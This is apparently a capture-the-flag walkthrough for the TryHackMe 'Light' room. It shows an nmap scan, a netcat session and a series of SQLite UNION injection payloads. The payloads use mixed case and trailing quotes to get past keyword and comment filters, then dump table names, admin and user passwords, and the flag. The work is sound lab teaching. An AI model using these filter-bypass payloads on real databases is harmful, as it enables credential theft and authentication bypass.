# Overview

![](www.tryhackme.com/r/room/lightroom?utm_campaign=social_share&utm_medium=social&utm_source=twitter)

The application is vulnerable to SQL Injection in theÂ usernameÂ input field. User input is concatenated directly into the SQL query string without proper sanitization or parameterization, making it possible for attackers to inject malicious SQL code. Although the application attempts to filter potentially malicious input (e.g.,Â /*,Â --,Â %0b,Â union, andÂ select), these filters can be bypassed with slightly obfuscated payloads.


# Step 1:
run a scan against the ip address of your target:

```bash
$

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.9 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|_  256 77:e1:36:3b:95:9d:e0:3e:0a:56:82:b2:9d:4c:fe:1a (ED25519)
1337/tcp open  waste?
| fingerprint-strings: 
|   GenericLines, GetRequest, HTTPOptions, RTSPRequest: 
|     Welcome to the Light database!
|     Please enter your username: Username not found.
1 service unrecognized despite returning data. 
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

```

# Step 2 

##  Manual Enumeration

I connect using 

```bash

$ nc 10.10.144.198 1337

```

and mannualy checking 

```bash 
$  nc 10.10.144.198 1337 
Welcome to the Light database!
Please enter your username: smokey
Password: vYQ5ngPpw8AdUmL
Please enter your username: '
Error: unrecognized token: "''' LIMIT 30"
Please enter your username: ' or 1=1;--
For strange reasons I can't explain, any input containing /*, -- or, %0b is not allowed :)
Please enter your username: 
```

```bash
1. Entering smokey as the username returns a password response: vYQ5ngPpw8AdUmL.
2. Using a single quote (') triggers an error: Error: unrecognized token: "''' LIMIT 30", suggesting a possible SQL injection vulnerability.

```

That makes senseâ€”SQLite is a strong possibility given the error message format and LIMIT 30. Your next steps should focus on:

1. Confirming the Database Type (SQLite)
Since SQLite doesn't support typical version queries like SELECT @@version, try:

```bash 

Please enter your username: ' UNION SELECT sqlite_version()--  
For strange reasons I can't explain, any input containing /*, -- or, %0b is not allowed :)
Please enter your username: ' unIoN seLEcT sQLiTe_vERsion()--
For strange reasons I can't explain, any input containing /*, -- or, %0b is not allowed :)
Please enter your username: ' unIoN seLEcT sQLiTe_vERsion()'
Password: 3.31.1
Please enter your username: 
```

2. Determining the Number of Columns and Identifying Table Names

```bash 

Please enter your username: ' ORDER BY 2'
Error: near "''": syntax error
Please enter your username: ' ORder bY 2--                                                      
For strange reasons I can't explain, any input containing /*, -- or, %0b is not allowed :)
Please enter your username: ' ORder bY 2'
Error: near "''": syntax error
Please enter your username: ' UNION SELECT NULL'
Ahh there is a word in there I don't like :(
Please enter your username: ' UNION SELECT NULL, null'
Ahh there is a word in there I don't like :(
Please enter your username: ' unIoN seLecT nUlL, NuLL'
Error: SELECTs to the left and right of UNION do not have the same number of result columns
Please enter your username: ' Union Select group_concat(tbl_name) from sqlite_master'
Password: usertable,admintable
Please enter your username: 

```

## question 1 : What is the admin username?

```bash

Please enter your username: ' unIoN seLecT username from admintable'                           
Password: [REDACTED]
Please enter your username: 


```
## question 2 : What is the password to the username mentioned in question 1


```bash 

Please enter your username: ' unIoN seLecT password from admintable where username=Try[REDACTED]'
Error: near "''": syntax error
Please enter your username:  ' unIoN seLecT password from admintable where username=Try[REDACTED] 
Error: unrecognized token: "' LIMIT 30"
Please enter your username:  ' unIoN seLecT password from admintable where username=Try[REDACTED]  
Username not found.
Please enter your username: ' unIoN seLecT password from admintable where username='Try[REDACTED]
Password: mam[REDACTED]
Please enter your username: 

```


I find another user alice and when we type in her name we get her password tF8tj2o94WE4LKC

```bash 

Please enter your username: ' unIoN seLecT username from usertable'
Password: alice
Please enter your username: ' unIoN seLecT password from usertable where username='alice   
Password: tF8tj2o94WE4LKC
Please enter your username: ' unIoN seLecT password from usertable where username='alice
Password: tF8tj2o94WE4LKC

```

## quetion 3: What is the flag?

```bash

Please enter your username: ' Union Select password FROM admintable WHERE username not like 'T%
Password: THM{REDACTED}
Please enter your username: 

```

### impact

1. **Data Breach**: Attackers can retrieve sensitive data, such as usernames and passwords, from the database.
2. **Authentication Bypass**: Attackers can potentially log in as any user without knowing their credentials.
3. **System Compromise**: If combined with other vulnerabilities, SQL injection could lead to privilege escalation or arbitrary code execution.
